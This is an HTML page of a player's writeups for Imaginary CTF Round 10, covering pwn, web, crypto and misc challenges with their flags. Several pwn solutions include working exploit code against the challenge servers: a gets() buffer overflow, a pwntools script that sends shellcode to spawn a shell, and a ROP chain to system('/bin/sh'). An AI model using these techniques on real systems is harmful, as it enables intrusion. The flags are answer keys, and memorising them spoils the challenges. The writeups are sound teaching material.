@@ -1,0 +1,749 @@
+<!DOCTYPE HTML>
+<html>
+  <head>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.7.2/build/styles/an-old-hope.min.css">
+    <link rel="icon" href="https://i.imgur.com/wQxv5zm.png" type="image/gif" sizes="16x16">
+    <title>Max49 Imaginary CTF Round 10 Writeups</title>
+    <meta content="Imaginary CTF Writeups" property="og:site_name">
+    <meta content="Max49 Imaginary CTF Round 10 Writeups" property="og:title">
+    <meta content="Writeups for Round 10 of Imaginary CTF!" property="og:description">
+    <meta content="https://www.max49.cf/good_directory/writeups-for-round-10.html" property="og:url">
+    <meta content="https://i.imgur.com/wQxv5zm.png" property="og:image">
+    <meta content="#000000" data-react-helmet="true" name="theme-color">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6"
+    crossorigin="anonymous">
+    <meta name="viewport" content="width=device-width">
+    <link href="/static/writeups.css" rel="stylesheet" type="text/css">
+  </head>
+  <body>
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.7.2/build/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <script src="/static/js/main.js"></script>
+    <script language="javascript">
+        function changeImage() {
+
+            if (document.getElementById("imgClickAndChange").src == "https://www.jing.fm/clipimg/full/132-1327227_moon-clipart-moon-clipart-black-and-white-half.png") 
+            {
+                document.getElementById("imgClickAndChange").src = "https://www.jing.fm/clipimg/full/63-631481_rays-clipart-black-grey-sun-sun-cartoon-png.png";
+                document.body.style.background = "#ffffff";
+                document.body.style.color = "#37393e";
+                var x = document.getElementsByClassName("chall");
+                for (var i = 0; i < x.length; i++) {
+                    x[i].style.background = "#f3f3f4";
+                    x[i].style.color = "#37393e"
+                }
+                var x = document.getElementsByClassName("pre");
+                for (var i = 0; i < x.length; i++) {
+                    x[i].style.background = "#f3f3f4";
+                    x[i].style.color = "#37393e";
+                }
+                var oldlink = document.getElementsByTagName("link").item(0);
+
+                var newlink = document.createElement("link");
+                newlink.setAttribute("rel", "stylesheet");
+                newlink.setAttribute("type", "text/css");
+                newlink.setAttribute("href", "https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.7.2/build/styles/default.min.css");
+
+                document.getElementsByTagName("head").item(0).replaceChild(newlink, oldlink);
+            }
+            else 
+            { 
+                document.getElementById("imgClickAndChange").src = "https://www.jing.fm/clipimg/full/132-1327227_moon-clipart-moon-clipart-black-and-white-half.png";
+                document.body.style.background = "#37393e";
+                document.body.style.color = "#ffffff";
+                var x = document.getElementsByClassName("chall");
+                for (var i = 0; i < x.length; i++) {
+                    x[i].style.background = "#2f3037";
+                    x[i].style.color = "#ffffff";
+                }
+                var x = document.getElementsByClassName("pre");
+                for (var i = 0; i < x.length; i++) {
+                    x[i].style.background = "#1e1e1e";
+                    x[i].style.color = "#ffffff";
+                }
+                var oldlink = document.getElementsByTagName("link").item(0);
+
+                var newlink = document.createElement("link");
+                newlink.setAttribute("rel", "stylesheet");
+                newlink.setAttribute("type", "text/css");
+                newlink.setAttribute("href", "https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.7.2/build/styles/an-old-hope.min.css");
+
+                document.getElementsByTagName("head").item(0).replaceChild(newlink, oldlink);
+            }
+        }
+        function showCode() {
+          if (document.getElementById("icicle-beginner").style.display == "inline") {
+            document.getElementById("icicle-beginner").style.display = "none";
+          } else {
+            document.getElementById("icicle-beginner").style.display = "inline";
+          }
+        }
+    </script>
+
+    <div class="jumbotron text-center">
+      <img class="pfp" src="https://i.imgur.com/wQxv5zm.png" height="150px" width="auto" />
+      <h1>Max49's ICTF Round 10 Challenge Writeups</h1>
+      <p>Color Key (by point value, not by me): Green = Easy, Yellow = Easy/Medium, Orange = Medium, Red = Hard</p>
+    </div>
+
+    <img style="position: fixed; bottom: 0; right: 0; border: 0; padding: 20px;" id="imgClickAndChange" height="100px" width="auto" src="https://www.jing.fm/clipimg/full/132-1327227_moon-clipart-moon-clipart-black-and-white-half.png" onclick="changeImage()" alt="" draggable="false"/>
+    
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy chall">
+          <h3>Sanity Check Round 10</h3>
+          <p>Welcome to Round 10! DM flags to me to get points, and rise up on the leaderboard! Have fun and enjoy Round 10!</p>
+          <h5>Attachments</h5>
+          <a href="https://forms.gle/Yyb19PmAxJjyiuCP9" target="_blank">https://forms.gle/Yyb19PmAxJjyiuCP9</a><br /><br />
+          <h5>Category</h5>
+          <p>Misc</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>Board</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>15</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>To solve this challenge, all you had to do was submit the Google form (with good feedback, but you could've edited it afterwards if you wanted to rush through it just to get the flag).</p>
+          <p><b>Difficulty rating:</b> 1/10</p>
+          <p><b>Guessy rating:</b> 1/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{S@nity_Check_R0und_10}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy chall">
+          <h3>&amp;aaa</h3>
+          <p>Pwn my server. Connect with <span class="pre">nc oreos.ctfchallenge.ga 7331</span>.</p>
+          <h5>Attachments</h5>
+          <a href="https://imaginary.ml/r/3727-aaa" target="_blank">https://imaginary.ml/r/3727-aaa</a><br /><br />
+          <h5>Category</h5>
+          <p>Pwn</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>Eth007</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>30</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>To solve this challenge, you could have decompiled the binary in ghidra to see that the input had a buffer of 20 characters, which tells you that this is probably buffer overflow. Alternatively, you could've done what I did, which was seeing the category as "pwn" and just inputting <span class="pre">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAA</span> to get the flag (main function below with my comments).</p>
+          <pre>
+            <code class="c">
+#include &#60;stdio.h&#62;
+
+int main() {
+  int admin=0;
+  char name[20]; /* [20] is a buffer */
+  setvbuf(stdout,NULL,2,0);
+  setvbuf(stdin,NULL,2,0);
+  puts("Enter username and password, separated by spaces:");
+  gets(name); /* gets() allows for buffer overflow */
+  if (admin != 0) {
+    system("cat flag.txt"); /* overflow changes the value of admin and prints the flag */
+  }
+}
+            </code>
+          </pre>
+          <p><b>Difficulty rating:</b> 1/10</p>
+          <p><b>Guessy rating:</b> 1/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{buff3r_0verfl0w_1s_d4ng3r0us}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy chall">
+          <h3>Waiting game...</h3>
+          <p>Life's a waiting game... sometimes you have to wait for a while to get ahead</p>
+          <h5>Attachments</h5>
+          <a href="https://waiting-game.max49.repl.co/" target="_blank">https://waiting-game.max49.repl.co/</a><br /><br />
+          <h5>Category</h5>
+          <p>Web</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>Max49</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>30</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Intended Solve:</h3>
+          <p>A quick way to solve this challenge was to just view source and see the url that you would eventually be redirected to in the head. If that's too boring, you also could have used a web interceptor like burp to change the html before the page loaded so that you would be redirected quicker. Going to the url that you would've been redirected to gives you the flag.</p>
+          <p><b>Difficulty rating:</b> 1/10</p>
+          <p><b>Guessy rating:</b> 1/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{a_r3a11y_n1ce_wa1t1ng_gam3}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy-medium chall">
+          <h3>Countdown Baseball</h3>
+          <p>Waiting for the 10 seconds its going to take people to solve this.</p>
+          <h5>Attachments</h5>
+          <a href="https://imaginary.ml/r/A1F0-countdown-baseball.txt" target="_blank">https://imaginary.ml/r/A1F0-countdown-baseball.txt</a><br /><br />
+          <h5>Category</h5>
+          <p>Crypto</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>FIREPONY57</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>75</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>In this challenge, you're given a long text file with one long line seemingly in binary (base 2). Using <a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a> to decode "From binary" gives us a string seemingly in base 3. From here, we can assume that we will keep increasing this number to get the flag. I used <a href="https://onlineasciitools.com/convert-arbitrary-base-to-ascii" target="_blank">this website</a> from here to finish this up until I reached a string in decimal, from which I converted to ascii to get the flag.</p>
+          <p><b>Difficulty rating:</b> 3/10</p>
+          <p><b>Guessy rating:</b> 5/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{b@s3s_g@10r3}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy-medium chall">
+          <h3>neat-rsa</h3>
+          <p>RSA is pretty neat, especially when a source is provided.</p>
+          <h5>Attachments</h5>
+          <p><a href="https://imaginary.ml/r/C2F4-main.py" target="_blank">https://imaginary.ml/r/C2F4-main.py</a><br /><a href="https://imaginary.ml/r/A9AA-rsa.txt" target="_blank">https://imaginary.ml/r/A9AA-rsa.txt</a></p>
+          <h5>Category</h5>
+          <p>Crypto</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>ainz</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>65</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>So this challenge involves knowing a little bit about math (thanks to Robin and ainz for helping me with this). So in rsa.txt, you're given <span class="pre">n1</span>, <span class="pre">n2 + n1 * elusive</span>, and the ciphertext. From the python file, we can additionally see that n1 is p * q, n2 is q * r, and p, q, and r are 512-number long random prime numbers. We also see that e = 65537 and elusive is a completely random number. From all the randomness in this program, someone might be turned away, but there's some interesting properties here. First of all, we can see that n1 and n2 share a common factor, q. From here, we can know that gcd(n1, n2) = q because using random numbers:</p>
+          <p>gcd(20, 28) = 4</p>
+          <p>gcd(5 * 4, 4 * 7) = 4</p>
+          <p>From here, looking at what we're given in rsa.txt, we can try to figure out what gcd(n1, n2 + n1 * elusive) could be. Using random numbers again:</p>
+          <p>gcd(20, 28) = 4</p>
+          <p>gcd(20, 28 + 20 * 15) = 4</p>
+          <p>From this, we can see that gcd of these two numbers is also q. Since we actually have both of these numbers, we now know we can find the gcd of these two numbers to get q (I used <a href="https://www.dcode.fr/gcd" target="_blank">this website</a>). Once we get q, we can do n1 / q to get p (I used <a href="https://sagecell.sagemath.org/" target="_blank">sagemath</a> to get the full number), and now that we have p, q, e, and the ciphertext, it's textbook rsa from here. I used RsaCtfTool to get the flag.</p>
+          <p><b>Difficulty rating:</b> 5/10</p>
+          <p><b>Guessy rating:</b> 1/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{why_c@nt_1_ev3r_c0m3_up_with_c0ol3r_flag5_:rooNobooli:}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy-medium chall">
+          <h3>Horst</h3>
+          <p>I found this interesting cipher structure. Could you check if it's secure?</p>
+          <h5>Attachments</h5>
+          <p>- <a href="https://imaginary.ml/r/5188-horst.py" target="_blank">https://imaginary.ml/r/5188-horst.py</a><br />- <a href="https://imaginary.ml/r/A0D2-output.txt" target="_blank">https://imaginary.ml/r/A0D2-output.txt</a></p>
+          <h5>Category</h5>
+          <p>reversing, crypto</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>Robin_Jadoul</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>75</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>unsolved :(</p>
+          <p><b>Difficulty rating:</b> ?/10</p>
+          <p><b>Guessy rating:</b> ?/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>not found</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy chall">
+          <h3>Green shell</h3>
+          <p>The Green Shell is a launchable, which when launched from a player, will start moving. The shell takes 5 bounces on walls before it will break. This can be deadly to players ahead as they must dodge it. It is referred to players as the "worst" shell, mainly because it roams freely instead of targeting a player. The shell is green with black lines. Connect with <span class="pre">nc oreos.imaginary.ml 12345</span>.</p>
+          <h5>Attachments</h5>
+          <p><a href="https://imaginary.ml/r/39AF-dist.zip" target="_blank">https://imaginary.ml/r/39AF-dist.zip</a></p>
+          <h5>Category</h5>
+          <p>pwn</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>Robin_Jadoul</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>50</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>For this challenge, it was later said that "The program runs any shellcode you give it," which basically tells us what we have to do. Thanks to ainz and Robin for helping me on this problem because previously, I had no idea how to get shell on a remote server. Looking at pwntools' documentation, pwntools actually has <a href="https://docs.pwntools.com/en/stable/shellcraft/amd64.html#pwnlib.shellcraft.amd64.linux.sh" target="_blank">a feature</a> to produce shellcode, facilitating this process. After some experimentation, I was able to make this script:</p>
+          <pre>
+            <code class="python">
+from pwn import *
+
+context.arch = "amd64"
+p = remote('oreos.ctfchallenge.ga',12345) 
+shellcode = shellcraft.amd64.linux.sh()
+
+p.sendline(asm(shellcode))
+p.sendline(b'cat flag.txt')
+p.recv()
+
+p.interactive()
+            </code>
+          </pre>
+          <p><b>Difficulty rating:</b> 4/10</p>
+          <p><b>Guessy rating:</b> 1/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{it's-a_me_sh3llc0d10}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy chall">
+          <h3>Wordbook</h3>
+          <p>"I'm going to learn some new words..." *opens book</p>
+          <h5>Attachments</h5>
+          <p><span class="pre">nc imaginary.ml 10069</span></p>
+          <h5>Category</h5>
+          <p>Misc</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>FIREPONY57</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>50</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>So when you connect to the server, you're given an encrypted flag and the option to encrypt your own text in the same way. When inputting <span class="pre">ictf{</span>, it can be seen that the characters match the first 5 characters of the encrypted flag. So I then got <span class="pre">string.printable</span> from python and inputted that. From there I made this script to get me the flag.</p>
+          <pre>
+            <code class="python">
+flag = ""
+flag_encoded= "ƑſƲƈǇƂéſƲéæƠĖƬƑïƯųƝĖƗïųǁæƵųƯƝĖƬûïƬǍ"
+
+printable = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'(
+)*+,-./:;<=>?@[\]^_`{|}~"
+printable_encoded = "æéìïòõøûþāŹżſƂƅƈƋƎƑƔƗƚƝƠƣƦƩƬƯƲƵƸƻƾǁǄęĜğĢĥĨīĮıĴķĺĽŀŃņŉŌŏŒŕŘśŞšŤ¹¼
+¿ÂÅÈËÎÑÔ×ÚÝàãĄćĊčĐēĖŧŪŭŰųŶǇǊǍǐ¶æéìïòõøûþāŹżſƂƅƈƋƎƑƔƗƚƝƠƣƦƩƬƯƲƵƸƻƾǁǄęĜğĢĥĨīĮıĴķĺĽŀŃņŉŌ
+ŏŒŕŘśŞšŤ¹¼¿ÂÅÈËÎÑÔ×ÚÝàãĄćĊčĐēĖŧŪŭŰųŶǇǊǍǐ¶"
+
+dictionary = {}
+
+for i in range(len(printable)):
+	dictionary[printable_encoded[i]] = printable[i]
+
+for i in range(len(flag_encoded)):
+	flag += dictionary[flag_encoded[i]]
+
+print(flag)
+            </code>
+          </pre>
+          <p><b>Difficulty rating:</b> 2/10</p>
+          <p><b>Guessy rating:</b> 3/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{d1ct10n@ri3s_m@k3_y0u_sm@r73r}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy-medium chall">
+          <h3>Introductory ICICLE</h3>
+          <p>Introducing ICICLE (Imaginary Ctf Instruction Collection for Learning assEmbly)! It's a programming challenge, so I didn't want to use an existing language and give some people an unfair advantage, so I made my own! See the spec and implement an interpreter to run the provided file, and get the flag.</p>
+          <h5>Attachments</h5>
+          <p><a href="https://imaginary.ml/r/8DFE-chall1.s" target="_blank">https://imaginary.ml/r/8DFE-chall1.s</a>, <a href="https://imaginary.ml/r/1560-spec_v1.md" target="_blank">https://imaginary.ml/r/1560-spec_v1.md</a> </p>
+          <h5>Category</h5>
+          <p>Programming/Reversing</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>puzzler7</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>100</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>So for this challenge, you're given some intructions in a .s file as well as a .md file of what those instructions are for. From here, you could've gone one of two ways: either reverse the file and make a script specifically for this challenge, or make an interpreter to automatically interpret any ICICLE program. I went the reversing route and make a script by going down the list of instructions and making python equivalents of those instructions as I went. The hardest part of this challenge in my opinion was making the <span class="pre">xor()</span> function, but overall, it was a cool chall. Here was my final script:</p>
+          <button onclick="showCode()">Show Code</button>
+          <br />
+          <pre id="icicle-beginner" style="display: none;">
+            <code class="python">
+def xor(a1, a2):
+    if(len(a1) > len(a2)):
+        longer_string = a1
+        shorter_string = a2
+    else:
+        longer_string = a2
+        shorter_string = a1
+    short_xor_index = 0
+    ret = b""
+    for i in range(len(longer_string)):
+        if(short_xor_index > len(shorter_string) - 1):
+            short_xor_index = 0
+        ret +=  bytes([longer_string[i] ^ shorter_string[short_xor_index]])
+        short_xor_index += 1
+    assert len(ret) == len(longer_string)
+    return ret
+        
+r1 = 208711228920503662662639293024172016224701481804426304526365809516810887455991148719975
+r1 = bytes.fromhex(hex(r1)[2:])
+r2 = 7696217
+r2 = bytes.fromhex(hex(r2)[2:])
+r2 = r2[::-1]
+print(r2)
+r1 = xor(r1, r2)
+r2 = b"dluohs"
+r2 = r2[::-1]
+print(r2)
+r1 = xor(r1, r2)
+r2 = b"really"
+print(r2)
+r1 = xor(r1, r2)
+r2 = 435744764535
+r2 = bytes.fromhex(hex(r2)[2:])
+r2 = r2[::-1]
+print(r2)
+r1 = xor(r1, r2)
+r2 = 6645876
+r2 = bytes.fromhex(hex(r2)[2:])
+r2 = r2[::-1]
+print(r2)
+r1 = xor(r1, r2)
+r2 = 138296649583178892197523049
+r2 = bytes.fromhex(hex(r2)[2:])
+r2 = r2[::-1]
+print(r2)
+r1 = xor(r1, r2)
+r2 = 28254586044378729
+r2 = bytes.fromhex(hex(r2)[2:])
+r2 = r2[::-1]
+print(r2)
+r1 = xor(r1, r2)
+r2 = b"fo"
+r2 = r2[::-1]
+print(r2)
+r1 = xor(r1, r2)
+r2 = b"gniod"
+r2 = r2[::-1]
+print(r2)
+r1 = xor(r1, r2)
+r2 = 1936287860
+r2 = bytes.fromhex(hex(r2)[2:])
+r2 = r2[::-1]
+print(r2)
+r1 = xor(r1, r2)
+r2 = 157746064591442268284274
+r2 = bytes.fromhex(hex(r2)[2:])
+r2 = r2[::-1]
+print(r2)
+r1 = xor(r1, r2)
+r2 = 1936287828
+r2 = bytes.fromhex(hex(r2)[2:])
+r2 = r2[::-1]
+print(r2)
+r1 = xor(r1, r2)
+r2 = b"is"
+print(r2)
+r1 = xor(r1, r2)
+r2 = 7628901
+r2 = bytes.fromhex(hex(r2)[2:])
+print(r2)
+r1 = xor(r1, r2)
+r2 = b"first"
+print(r2)
+r1 = xor(r1, r2)
+r2 = 28265
+r2 = bytes.fromhex(hex(r2)[2:])
+r2 = r2[::-1]   
+print(r2)
+r1 = xor(r1, r2)
+r2 = b"a"
+r2 = r2[::-1]
+print(r2)
+r1 = xor(r1, r2)
+r2 = 32481164390658862
+r2 = bytes.fromhex(hex(r2)[2:])
+print(r2)
+r1 = xor(r1, r2)
+print(r1.decode())
+r2 = 100
+r2 = r2 % 7
+r3 = r2 * 5
+r3 = bytes.fromhex('0a') # I did this because hex(10) would 
+return 'a' instead of '0a'
+print(r3.decode())
+            </code>
+          </pre>
+          <br />
+          <p>Adding the print statements before each xor prints a secret message: "You should really write the interpreter instead of doing this reversing! This is the first in a series."</p>
+          <p>Thanks to Robin and puzzler7 for helping me out on this one!</p>              
+          <p><b>Difficulty rating:</b> 5/10</p>
+          <p><b>Guessy rating:</b> 1/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{th3_w@rm3st_ICICLE_y0u've_s33n}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy-medium chall">
+          <h3>&bbb</h3>
+          <p>You overflowed my buffer, now get a shell. The flag is located in <span class="pre">another_flag.txt</span>. Connect with <span class="pre">nc oreos.ctfchallenge.ga 7331</span>. Good luck! (The binary and connection are the same as in the previous challenge, called "&aaa")</p>
+          <h5>Attachments</h5>
+          <p><a href="https://imaginary.ml/r/3727-aaa" target="_blank">https://imaginary.ml/r/3727-aaa</a></p>
+          <h5>Category</h5>
+          <p>Pwn</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>Eth007</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>85</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>Thanks so much to Eth007 for helping me out on this chall, because I had basically no idea what I was doing. I'll just bring you through the process I went through to get the flag for this challenge (it might be a little long).</p>
+          <p>So firstly, this is the same binary/server as <span class="pre">&aaa</span>, meaning that buffer overflow will still get you that flag. What's different about this chall is that you need to go further (get shell) in order to get the other flag. In the previous challenge where we had to get shell, Green Shell, the program just executed whatever shellcode was given, so reusing that script won't work. In this case, we need to use the <span class="pre">gets()</span> to get <span class="pre">/bin/sh</span> to execute. Looking at the decompiled code in ghidra, we can see that there's a <span class="pre">system()</span> function that looks to execute commands and looking at the middle column of ghidra, we can see <span class="pre">/bin/sh</span> written out across different addresses. From here, we know we need to somehow make the program execute the <span class="pre">/bin/sh</span> in <span class="pre">system()</span>.</p>
+          <p>First, we need to figure out our offset in order to get the offset we need to start calling memory addresses. Using pwntools, we can do this by first running <span class="pre">cyclic -n 8 1000</span> to get random characters, getting a seg fault, finding the value of the base pointer ($rbp), and then running <span class="pre">cyclic -l &#60;value of rbp&#62; -n 8</span> (where in this case, rbp was 0x6161616161616165) to get the offset for the base pointer. To get the offset of the instruction pointer ($rip), we just add 8 to get an offset of 40.</p>
+          <p>So now we can move onto getting <span class="pre">/bin/sh</span> to call in <span class="pre">system()</span>. Since we want a value to be passed into the first parameter of the <span class="pre">system()</span> function to be run, we want to have $rdi equal <span class="pre">/bin/sh</span> ($rdi is used to pass the first parameter to functions). To get things moving in the stack, we need gadgets. These can be gotten using the command <span class="pre">ROPgadget --binary aaa</span> and grepping for the values we want. In this case, we want <span class="pre">ret</span> to pop the original return address and <span class="pre">pop rdi</span>. Once we grep for these gadgets, we can start to craft our payload.</p>
+          <p>In our payload, we first need the offset, which we first determined to be <span class="pre">b"A"*40</span>. We then add the ret gadget (<span class="pre">p64(0x000000000040101a)</span>) and the pop rdi gadget (<span class="pre">p64(0x000000000040191a)</span>) so we can add a new address to the return value of the main function. We then add the address of the /bin/sh (<span class="pre">p64(0x00497895)</span>) to fill the spot of the $rdi that we popped and finally the address of system() (<span class="pre">p64(0x00411090)</span>) to fill the spot of $ret that we popped. My final script looked like this:</p>
+          <pre>
+            <code class="python">
+from pwn import *
+
+context.arch='amd64'
+p = remote("oreos.ctfchallenge.ga", 7331)
+
+offset = 40
+p.recvuntil("Enter username and password, separated by spaces:") 
+
+payload = b'A'*offset + p64(0x000000000040101a) + p64(0x000000000040191a) 
++ p64(0x00497895) + p64(0x00411090)
+
+p.sendline(payload)
+p.interactive() 
+            </code>
+          </pre>
+          <p>Running this script should get us shell and from there, we can just <span class="pre">cat another_flag.txt</span> to get the flag</p>
+          <p>This challenge makes use of ROP (Return Oriented Programming) to make a ropchain of memory addresses to get us what we want</p>
+          <p><b>Difficulty rating:</b> 6/10</p>
+          <p><b>Guessy rating:</b> 1/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{r0p_t0_th3_r3scu3!}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy-medium chall">
+          <h3>Imaginary Shop</h3>
+          <p>I just opened my own Imaginary Shop! Come check it out and see what we have to offer. I'm confident it's perfect in every way.</p>
+          <h5>Attachments</h5>
+          <p><a href="https://imaginary-shop.max49.repl.co/" target="_blank">https://imaginary-shop.max49.repl.co/</a></p>
+          <h5>Category</h5>
+          <p>Web</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>Max49</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>82</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Intended Solve:</h3>
+          <p>So you're actually given the source for this web chall, which makes things much easier. Just by looking for the word "flag" in the code, you can see that the flag is inside the 500 error handler, meaning that we most likely have to get a 500 error in order to access the flag. In flask sites, which is what this is, 500 error are usually returned when an error is encountered in the python code, so now we know we should look through the code in order to find something to error. The "intended" functionality of this website is to buy items from a certain list with enough money, both items gotten from url arguments (ex. <span class="pre">/shop?buy=water&money=100</span>). The way to get the code to error was to omit the <span class="pre">money</span> argument after adding a correct <span class="pre">buy</span> argument (ex. <a href="https://imaginary-shop.max49.repl.co/shop?buy=water" target="_blank">https://imaginary-shop.max49.repl.co/shop?buy=water</a>) After the code errored, all you had to do was match the cookies being checked for in the 500 error handler. This could be accomplished with cURL to get the flag (command: <span class="pre">curl -b "item=1;money=1;add=1" https://imaginary-shop.max49.repl.co/shop?buy=bagel</span>).</p>
+          <p><b>Intended Difficulty rating:</b> 4/10</p>
+          <p><b>Indended Guessy rating:</b> 1/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{1nt3nt10nal_f1ask_pyth0n_3rr0rs?}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <p><center>.............................</center></p>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy chall">
+          <h3>Boxed in</h3>
+          <p>Box outside the think.</p>
+          <h5>Attachments</h5>
+          <p><a href="https://imaginary.ml/r/BE85-boxed_in.c" target="_blank">https://imaginary.ml/r/BE85-boxed_in.c</a>, <span class="pre">nc oreos.imaginary.ml 30000</span></p>
+          <h5>Category</h5>
+          <p>misc</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>Robin_Jadoul</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>100</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>In general, "think outside the box" when referring to tic-tac-toe (which is what the program is) means to place your move outside the 3x3 grid in order to make a 3 in a row. We see that in the source, our input is an "unsigned long" and from <a href="https://www.tutorialspoint.com/cprogramming/c_data_types.htm" target="_blank">this website</a>, we can see that the maximum value of an unsigned long is 18446744073709551615. From here, we can attempt to integer overflow the variable and from what we know about integer overflow, the maximum value + 1 = -1, which would place our tile right off the grid. Aligning our first two squares like below and then inputting the row as 18446744073709551616 and the column as 0 gave us the flag.</p>
+          <center><img src="https://i.imgur.com/T1vhE5L.png" alt="" height="auto" width="50%" /></center>
+          <br />
+          <p><b>Difficulty rating:</b> 3/10</p>
+          <p><b>Guessy rating:</b> 1/10</p>
+        </div>
+        <div class="flag">
